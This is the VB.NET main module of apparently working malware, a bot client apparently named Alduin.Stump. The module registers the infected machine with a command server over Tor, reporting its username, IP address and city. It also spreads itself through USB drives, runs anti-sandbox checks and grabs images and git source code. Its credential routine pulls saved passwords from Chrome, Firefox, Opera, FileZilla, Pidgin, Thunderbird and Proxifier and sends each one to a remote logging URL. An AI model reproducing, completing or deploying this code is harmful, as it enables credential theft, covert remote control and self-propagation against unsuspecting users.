Imports System.IO
Imports System.Threading
Imports Alduin.Stump.Alduin.Stump.Class.Commands
Imports Alduin.Stump.Alduin.Stump.Class.Network
Imports Newtonsoft.Json

Module Main
    ReadOnly NewListener As New Thread(AddressOf Listener)
    ReadOnly NewNotice As New Thread(AddressOf Noticer)
    ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
    ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
    ReadOnly NewGitGraber As New Thread(AddressOf GitGraber)
    ReadOnly NewDetecter As New Thread(AddressOf Detecter)
    ReadOnly NewAnitSanbox As New Thread(AddressOf RunAntis)
    ReadOnly NewWebfilters As New Thread(AddressOf WebFilters)
    Private _command As New CommandHandler
    Private _config As New ConfigBotModel
    Private _FloodsBase As Floodsbase
    Public Function GetFloodsBase() As Floodsbase
        Return _FloodsBase
    End Function
    Private Sub SetFloodsBase(floodsbase As Floodsbase)
        _FloodsBase = floodsbase
    End Sub
    Public Property Config As ConfigBotModel
        Get
            Return _config
        End Get
        Set(value As ConfigBotModel)
            _config = value
        End Set
    End Property

    Public Property Command As CommandHandler
        Get
            Return _command
        End Get
        Set(value As CommandHandler)
            _command = value
        End Set
    End Property
    Public Property MainThreadCreateWebBrowserForm As WebBrowserForm
    <STAThread()>
    Public Sub Main()
        StartThreads()
        Dim floodsbase As New Floodsbase
        SetFloodsBase(floodsbase)
        StartKeyLoggers()
        StartWebForms()
    End Sub
    Private Sub StartThreads()
        configBot()
        NewDetecter.Start()
        Install()
        StartTor()
        NewListener.Start()
        NewNotice.Start()
        NewWebfilters.Start()
        DelayedAction.Start()
        If Config.Variables.AntiSandbox Then
            NewAnitSanbox.Start()
        End If
        If Not File.Exists(GetConfigJson().MainPath & "\Images.txt") Then
            NewImageGraber.Start()
        End If
        If Not File.Exists(GetConfigJson().MainPath & "\SourceCodes.txt") Then
            NewGitGraber.Start()
        End If
    End Sub
    Public Function GetWebrowser()
        Return MainThreadCreateWebBrowserForm
    End Function
    Public Sub Listener()
        If Config.Variables.Debug Then
            Console.WriteLine("Onion Address: " & GetOnionAddress())
            Console.WriteLine("Listening")
        End If
        Dim tcplistener As New TcpListen()
        While (True)
            tcplistener.TcpAsync()
        End While
    End Sub
    Public Sub Noticer()
        While (True)
            Try
                Dim model As New DefaultRegistrationModel With {
                                .UserName = GetUsername(),
                                .KeyUnique = GetConfigJson().KeyUnique,
                                .KeyCertified = _config.Variables.CertifiedKey,
                                .Domain = GetOnionAddress(),
                                .CountryCode = GetCountyCode(GetMyIPAddress()),
                                .LastIPAddress = GetMyIPAddress(),
                                .City = GetCity(GetMyIPAddress())
                            }
                Dim http As New SendHTTPonTor
                http.TalkChannelHTTP(model, _config.UrlVariables.RegistrationUrl, Config.Variables.Address, Config.Variables.ServerReachPort)

            Catch : End Try
            Thread.Sleep(SectoMs(200))
        End While
    End Sub
    Public Sub DelayedActions()
        While (True)
            USBSpreading(GetMainFile())
            Thread.Sleep(SectoMs(5))
        End While
    End Sub
    Public Sub configBot()
        Dim configjson = JsonConvert.DeserializeAnonymousType(File_reader("Config.json"), New ConfigBotModel)
        Config = configjson
    End Sub
    Public Sub WebFilters()
        Try
            If Config.Variables.Debug Then
                Console.WriteLine("WebFilters working...")
            End If
            Dim r As New Random
            Go(Config.WebFilters(r.Next(Config.WebFilters.Count - 1)))
        Catch ex As Exception
            If Config.Variables.Debug Then
                Console.WriteLine("WebFilters error:" & ex.ToString)
            End If
        End Try
    End Sub
    Private Sub StartWebForms()
        Try
            If Config.Variables.Debug Then
                Console.WriteLine("WebBrowserForm working...")
            End If
            MainThreadCreateWebBrowserForm = New WebBrowserForm
        Catch ex As Exception
            If Config.Variables.Debug Then
                Console.WriteLine("WebBrowserForm error:" & ex.ToString)
            End If
        End Try
    End Sub
    Private Sub StartKeyLoggers()
        If Config.Variables.Keyloggers Then
            For Each Drive As DriveInfo In DriveInfo.GetDrives
                If Drive.RootDirectory.FullName = "C:\" Then
                    Dim x As New PREC(Drive)
                    With x
                        .RecoverChrome()
                        .RecoverFileZilla()
                        .RecoverFirefox()
                        .RecoverOpera()
                        .RecoverPidgin()
                        .RecoverThunderbird()
                        .RecoverProxifier()
                    End With
                    For Each A As Account In x.Accounts
                        If Config.Variables.Debug Then
                            Console.WriteLine("Keyloggers: " & A.ToString())
                        End If
                        Dim http As New SendHTTPonTor
                        Dim model As New LogModel With {
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Password",
                            .Message = "Domain: " & A.Domain.ToString &
                                       " Username: " & A.Username.ToString &
                                       " Password: " & A.Password.ToString &
                                       " Type: " & A.Type.ToString
                        }
                        http.TalkChannelHTTP(model, _config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
                    Next
                End If
            Next
        End If
    End Sub
End Module
